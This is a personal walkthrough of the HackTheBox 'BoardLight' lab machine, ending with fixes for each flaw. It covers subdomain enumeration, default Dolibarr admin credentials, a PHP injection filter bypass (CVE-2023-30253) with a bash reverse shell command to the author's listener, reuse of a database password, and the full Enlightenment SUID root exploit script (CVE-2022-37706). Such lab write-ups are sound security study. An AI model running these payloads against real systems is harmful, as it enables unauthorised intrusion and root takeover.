---
title: "BoardLight"
author: "Me"
date: "June 10, 2024"
output: html_document
---

# BoardLight

 <div id="boxinfo">
 <div id="textbox">
 <p class="alignleft">**Difficulty**: Easy</p>
 <p class="aligncenter">**Type**: CTF</p>
 <p class="alignright">**OS**: Linux</p>
 </div>
 <div style="clear: both;"></div>
 </div> 

  
**Ports/services exploited:** 80/http (CVE-2023-30253), 3306/MySQL, Enlightenment (CVE-2022-37706)\\
**Tools:** dirb, ffuf, Burp, Nikto, Linpeas\\
**Techniques:** PHP code injection\\
**Keywords:** Dolibarr (CRM/ERP), MySQL, SUID, Enlightenment

**TL;DR**: The target is running an Apache web server which hosts a web site. A careful enumeration reveals another domain hosted by the server, *crm.board.htb*. After adding this entry to our */etc/hosts* file, we can access the login page of a CRM called **Dolibarr** (version 17.0.0). The credentials are the default ones, that is "admin / admin". The version of the software is vulnerable to PHP code injection (CVE-2023-30253), allowing us to get a reverse shell as the user *www-data*.\\
From there, further enumeration reveals a user (larissa) and a MySQL database running locally on port 3306. Cleartext credentials can be found in a configuration file, and this allows us to connect to the database, and retrieve 2 hashed passwords. Unfortunately, those latter are useless, but it appears that the database password is also larissa's password. So, it can be reused to *su larissa*, or connect via *SSH*.\\
Then, linpeas reveals that *Enlightenment*, an open source desktop environment for unix systems, is installed on the target. Its version is vulnerable to CVE-2022-37706. An existing Github exploit allows us to escalate our privileges to root.

## 1. Services enumeration
{:style="color:DarkRed; font-size: 170%;"}

I wrote a small shell script that runs a *nmap* scan, and if it finds a web server running, it then runs *dirb* to search for existing directories,
and *ffuf* for subdomains enumeration. The results of the nmap scan are the following (*sudo nmap -sV -sC 10.10.11.11*):

```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-10 16:36 CEST
Nmap scan report for 10.10.11.11
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.08 seconds
```
There are 2 services running:

- SSH on port 22, which uses OpenSSH version 8.2p1 on Ubuntu Linux. Recent versions of SSH are usually secure, so we'll leave it aside for now and might come back to it later, when we have credentials or if we don't find anything else.
- HTTP on port 80, which is an Apache web server version 2.4.41. We see "Site doesn't have a title", but that doesn't matter. Let's browse to *10.10.11.11* and see what we find.

## 2. Gaining a foothold
{:style="color:DarkRed; font-size: 170%;"}

I added *10.10.11.11* to my */etc/hosts* file, so I can simply browse to *http://boardlight.htb*. We land on a page and see *"Welcome to BOARDLIGHT. Boardlight is a cybersecurity consulting firm spacializing in providing cutting-edge security solutions to protect your business from cyber threats"*.
The menu buttons (Home, About, What we do, and Contact us) are just anchors to sections on the same page. Most buttons, like the head icon which looks like a login button, the Youtube, Linkedin, Facebook buttons, do not work at all.
If we scroll down the page, there's a "contact us" form:

<div class="img_container">
![web]({{https://jsom1.github.io/}}/_images/htb_board_form.png){: height="400px" width = "500px"}
</div>

The fields of this formular are typical candidates for XSS, SQLi, SSTI, and other kind of vulnerabilities. 
Before trying to detect one of those, let's start a *dirb* scan to search for other existing directories, as well as an *ffuf* scan to enumerate potential subdomains (I realize afterwards I used the IP address in the commands, but the domain name would also work):

```
sudo dirb http://10.10.11.11 -r

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jun 10 17:41:58 2024
URL_BASE: http://10.10.11.11/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.11.11/ ----
==> DIRECTORY: http://10.10.11.11/css/                                                                           
==> DIRECTORY: http://10.10.11.11/images/                                                                        
+ http://10.10.11.11/index.php (CODE:200|SIZE:15949)                                                             
==> DIRECTORY: http://10.10.11.11/js/                                                                            
+ http://10.10.11.11/server-status (CODE:403|SIZE:276)                                                           
                                                                                                                 
-----------------
END_TIME: Mon Jun 10 17:44:41 2024
DOWNLOADED: 4612 - FOUND: 2
```

*Dirb* found some unaccessible directories (403 error, "Forbidden. You don't have permission to access this resource.") such as */css*, */images*, */js*, and */server-status*. The only one we can access is */index.php*, and this is the main page we landed on.\\
So, nothing interesting here. To be sure, we can run a second directory scan with *ffuf* and a different wordlist, and also *ffuf* to search for subdomains:

```
sudo ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.11.11 -H "Host: 10.10.11.11/FUZZ" -fs 15949
sudo ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.11 -H "Host: FUZZ.10.10.11.11"
```
In the first command, we filtered the responses having a size of 15949, because it was only false positives. The subdomain scan didn't reveal anything.

Let's have a look at the formular. We can start Burp, intercept the request and send it to the repeater:

<div class="img_container">
![burp]({{https://jsom1.github.io/}}/_images/htb_board_burp.png){: height="400px" width = "500px"}
</div>

This is weird, because we would expect a formular of that type to send a POST request, with the provided data in the request's body.\\
However, we see it's a GET request that doesn't contain the expected parameters. The reason could be that there is an error in code that sends the formular.\\
There could also be a JavaScript script which intercepts the request and transforms it into a GET request...\\
To check if the request was submitted, I checked if I received any confirmation email, but that was not the case.\\
The most probable scenario is just that it's a "fake" form, and nothing happens when we click on "Send". So, we have to find something else.

Next, we can use *nikto* to detect vulnerabilities in the web server. It looks for server misconfigurations, vulnerabilities in the softwares, and so on... In the command below, *-h* is used to specified to host:

```
sudo nikto -h 10.10.11.11
```
And here's the result:

<div class="img_container">
![nikto]({{https://jsom1.github.io/}}/_images/htb_board_nikto.png)
</div>

We see the web server is Apache version 2.4.41, which we already knew from the *nmap* scan. The following security headers are absent:

- X-Frame-Options: its absence could make the site vulnerable to clickjacking
- X-XSS-Protection: the fact it is not defined could make the site vulnerable to XSS (cross-site scripting). Indeed, web browsers can use this header to detect and prevent XSS attacks. An XSS attack consists in injecting malicious scripts into web pages that are being viewed by other people (such as a comment section, for example). If this header is defined, it can ask the browser to block the loading of the page. Because it is not defined here, the browser might not have it by default.
- X-Content-Type-Options: the fact it is not defined could allow a user agent to transform the site content into another MIME (Multipurpose Internet Mail Extensions) type than the one specified. When the header is not defined, it means that the browser can try to guess the content's MIME type. In some cases, that could allow an attacker to execute malicious scripts.

Finally, we also see the server responds with junk HTTP methods, and this is why *ffuf* returned so many false positives.\\
Unfortunataly, nothing really helps us here. Since the form doesn't seem to be the way, we must have missed something during enumeration... Let's try again with *gobuster* and *ffuff*, and with different wordlists.\\
Going back on the web page, I might have realized my mistake; there, at the botton of the page, we see the following email address: "*info@board.htb". However, by habit, I entered *boardlight.htb* in my */etc/hosts* file. So, all the previous *ffuf* commands didn't find anything because of this... Let's add the entry *10.10.11.11 board.htb* into our */etc/hosts* file, and try again:

<div class="img_container">
![ffuf]({{https://jsom1.github.io/}}/_images/htb_board_ffuf.png)
</div>

This time, it finds a subdomain, *crm*. If we add the entry *10.10.11.11 crm.board.htb* into our hosts file, we can then browse to it:

<div class="img_container">
![crm]({{https://jsom1.github.io/}}/_images/htb_board_crm.png){: height="400px" width = "500px"}
</div>

From what we see, Dolibarr is an ERP (Enterprise Resource Planner) and CRM (Customer Relationship Management). It is used to manage contacts, clients, providers, orders, and so on. Here, it is the version 17.0.0. The first thing to do is check on the internet if we can find de default credentials for Dolibarr. There are a few posts about that, and the following credentials are mentionned: "admin / changeme" and "admin / admin". The first one doesn't work, but "admin / admin" does:

<div class="img_container">
![login]({{https://jsom1.github.io/}}/_images/htb_board_login.png){: height="250px" width = "500px"}
</div>

Even though we are connected, there is nothing we can do on the page. If we open the menu in Safari and go to "Web Developer" > "Storage Inspector", we indeed see some information about our current session. Apparently, this information is used to manage the access on this page, and we have to find something else. We can search for any existing exploit in Metasploit:

```
searchsploit dolibarr
```
There are ~20 exploits, but all of them concern older versions of Dolibarr. Let's see if we can find vulnerabilities for this specific version of Dolibarr on the internet. A quick Google search reveals 2 promising leads:

- <a href="https://www.swascan.com/security-advisory-dolibarr-17-0-0/" target="_blank">Dolibarr 17.0.0 PHP Code Injection (CVE-2023-30253)</a>
- <a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253" target="_blank">POC exploit for Dolibarr <= 17.0.0 (CVE-2023-30253)</a>

The first links describes the vulnerability and how to exploit it, whereas the second one is a python script that exploits it directly. Let's have a look at the first one to understand how it works.\\
The description is the following: "*In Dolibarr 17.0.0 with the CMS Website plugin (core) enabled, an authenticated attacker can obtain remote command execution via php code injection bypassing the application restrictions.*". This seems promising, because we are authenticated, and we see the "Websites" button in the image above. If we click on it, we land on a page where we can create a website. So, it seems we have all the required ingredients.\\
Then, the article gives a POC to run system commands and the test conditions. We must be able to read website content, and create a website. We cannot see our permissions (the "Users & Groups" menu is greyed out), but from what we see, we should be able to add a new website.

Let's try to create a website and follow the POC:

<div class="img_container">
![create website]({{https://jsom1.github.io/}}/_images/htb_board_create.png){: height="250px" width = "500px"}
</div>

After that, we must create a new page:

<div class="img_container">
![create page]({{https://jsom1.github.io/}}/_images/htb_board_newpage.png){: height="250px" width = "500px"}
</div>

Finally, the vulnerability resides in the source code of the page:

<div class="img_container">
![php]({{https://jsom1.github.io/}}/_images/htb_board_php.png){: height="250px" width = "500px"}
</div>

Usually, we would write "php" in lowercase. But if we would do that, we would get the message "You don't have permission to add or edit PHP dynamic content in websites" (see the link above). However, we can still inject PHP code as a limited user if we write it in uppercase (apparently, it only checks "php"; we could write "Php", "pHp", "pHP", and so on...). It's a pretty poor check!

We can then save the page and check if our code got executed:

<div class="img_container">
![whoami]({{https://jsom1.github.io/}}/_images/htb_board_whoami.png){: height="250px" width = "500px"}
</div>

It worked, we can execute code on the machine! From there, it should be fairly easy to get a reverse shell.\\
Here's the reverse shell command that is used in the Python exploit:

```
<?pHp system(\"bash -c 'bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1'\"); ?>\n"
```

So, we adapt it for the right IP address (our tun0 address is given by *ifconfig tun0*) and port, and start a netcat listener:

```
<?pHp system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/4444 0>&1'"); ?>
sudo nc -nlvp 4444
```

<div class="img_container">
![payload]({{https://jsom1.github.io/}}/_images/htb_board_payload.png){: height="250px" width = "500px"}
</div>

We save it, and check if we got a connexion on our listener:

<div class="img_container">
![revsh]({{https://jsom1.github.io/}}/_images/htb_board_revsh.png)
</div>

Finally, we're in! We see we're "only" the *www-data* user, and we will have to find a way to become a "regular" user. In the image above, we used displayed the content of the /etc/passwd, which gives information about user accounts. If we scroll to the bottom of the file, we see a user called *larissa* (we also see it if we *cd ..* and check into the */home* directory; there, we only see *larissa*. 

## 3. Horizontal privilege escalation
{:style="color:DarkRed; font-size: 170%;"}

We must now find a way to switch to larissa, so we start enumerating once again. After looking into configuration files for the web server, I decided to use *Linpeas*. To do that, we have to serve it from Kali, and download it on the target machine. We start a web server on Kali in the directory that contains the script, and we download it with *wget*. Note that I downloaded it into the */tmp* directory:

```
cd /tmp -> in the revshell
sudo python3 -m http.server 8001 -> on Kali
wget http://10.10.14.13:8001/linpeas.sh -> in the revshell
chmod +x linpeas.sh -> in the revshell
./linpeas.sh > .lp_out.txt -> in the revshell
```

The last command above redirected Linpeas' output into a file, so that we can use "grep" afterwards if necessary. By insepcting the results, we see there is a service running locally (127.0.0.1) on port 3306, which is the default port for MySQL. For example, we could *grep* configurations files as follows:

```
grep "conf" .lp_out.txt
```
This reveals many configuration files, among which there is an interesting one: */var/www/html/crm.board.htb/htdocs/conf/conf.php*. Let's look at its content:

<div class="img_container">
![creds]({{https://jsom1.github.io/}}/_images/htb_board_creds.png)
</div>

We have everything we need to connect to the database and retrieve useful information. The command is the following:

```
mysql -u dolibarrowner -p'serverfun2$2023!!' -h localhost -P 3306 dolibarr
```
We specify the password directly in the command, because I tried just using *-p* and entering the password when prompted, but it didn't work (maybe because of the space?). Anyways, we can then display tables:

```
SHOW TABLES;
```
This reveals a lot of tables. Since we're interested in retrieving user information, we could have a look into the table *llx_user*. We can check its names, and then select only the information we want to keep:

```
SHOW COLUMNS FROM llx_user;
SELECT login, pass_crypted FROM llx_user;
exit
```

And here's the discovered passwords:

<div class="img_container">
![hashes]({{https://jsom1.github.io/}}/_images/htb_board_hashes.png)
</div>

This is unfortunate, as we were hoping to find Larissa's password. Also, those passwords are encrypted. Let's save and keep them in a file on Kali for now, and see if the database password can be reused for larissa:

```
su larissa
```

And we provide the password *serverfun2$2023!!*.

<div class="img_container">
![user]({{https://jsom1.github.io/}}/_images/htb_board_user.png)
</div>

Note that when we switched to Larissa, we used the usual python command to spawn an interactive shell (it's not 100% interactive, but it's better than what we had). Alternatively, we could also connect via SSH. And that's it for the user flag. Now, we must find a way to become root.

## 4. Vertical privilege escalation
{:style="color:DarkRed; font-size: 170%;"}

We're back at enumerating. The first thing we can do is to connect via SSH, so that we get a proper shell:

```
ssh larissa@10.10.11.11
```

Now, let's check what the current user can do:

```
sudo -l
```

We get the message "Sorry, user larissa may not run sudo on localhost". After enumerating manually for a while, I downloaded *Linpeas* once more. Indeed, it might disover new things because we can now run it as larissa instead of www-data. After a careful review of the output, there is something interesting in the SUID section:

<div class="img_container">
![linpeas]({{https://jsom1.github.io/}}/_images/htb_board_lp.png)
</div>

We see "Enlightenment", which probably isn't a coincidence given the name of the box (BoardLight). From ChatGPT, Enlightenment is an open source desktop environment for unix systems. The "Unknown SUID binary!" comes from the "s" we see in the file permissions in the image above: for example, we see "*-rwsr-sr-x*". That means that these files have the SUID (Set User ID) attribute set. When those files are executed, they will be so in the context of the file's owner rather than their own (and the file owner is root).\\
Let's have a look into *Enlightenment*. I asked ChatGPT to tell me how to interact with it, and to give me a few commands. It gave me the following one to check for the version:

```
enlightenment --version
```

This command indicates us that it's the version **0.23.1**. A quick Google search returns "*enlightenment_sys in Enlightenment before 0.25.4 allows local users to gain privileges because it is setuid root, and the system library function mishandles pathnames that begin with a /dev/.. substring*", and it mentions the **CVE-2022-37706** (<a href="https://nvd.nist.gov/vuln/detail/CVE-2022-37706" target="_blank">link</a>).\\
In the description, there is a link to a <a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit" target="_blank">Github exploit</a>. From the description, we should be able to use this exploit since the SUID binary is set. Here's the exploit code:

```
#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

We copy this code and create a file in larissa's SSH session, for example "tstexp.sh" (note that *curl* or *wget* don't work for what it seems to be a DNS issue, because it cannot resolve the host *www.github.com*).\\
Once we have the exploit, we make it executable and launch it:

```
chmod +x tstexp.sh
./tstexp.sh
```

Finally, we see if it worked:

<div class="img_container">
![root]({{https://jsom1.github.io/}}/_images/htb_board_root.png)
</div>

And it did, that's it for this machine!

<div class="img_container">
![pwn]({{https://jsom1.github.io/}}/_images/htb_board_pwn.png){: height="400px" width = "420px"}
</div>

<ins>**My thoughts**</ins>

Despite a rough start, I really enjoyed this machine. Indeed, I made the mistake of adding the machine name in my host file, and didn't pay enough attention to the web page, where the real domain name was. This is a good reminder for the next ones!\\
After that, the machine was rather easy and well rounded.

<ins>**Fix the vulnerabilities**</ins>

If we review the vulnerabilities step by step, here's how to fix them:

First, we found a vulnerable version of Dolibarr (17.0.0) to which we could log in with the credentials "admin / admin". The first thing to do here would be to change the password. Then, the version is vulnerable to PHP code injection. To prevent this from happening, it is essential to upgrade to the latest version.

Then, we found a cleartext password in a configuration file. This password was intended to be used for the MySQL database, but it also appeared to be a user's password. First, the password shouldn't be accessible to anyone on the machine, and if it is, it should be encrypted. Then, one should avoid reusing passwords.

Finally, we could elevate our privileges thanks to the SETUID bit being set for Enlightenment. One way to prevent it would be to remove it. It is important to regularly check SUID files to make sure they are not malicious or compromised.
